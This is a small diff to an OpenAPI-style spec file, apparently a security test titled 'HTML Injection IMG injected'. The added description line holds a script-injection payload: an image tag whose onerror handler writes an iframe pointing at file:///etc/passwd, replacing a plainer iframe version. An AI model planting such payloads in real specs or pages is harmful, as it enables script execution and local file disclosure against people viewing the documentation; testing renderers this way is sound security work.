@@ -4,7 +4,7 @@ info:
   title: HTML Injection IMG injected
   description: '
         <h1>Iframe Test By Raman MG : LFI Test </h1>
-        <iframe src=file:///etc/passwd></iframe>
+        <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')">
     '
 paths:
   /:
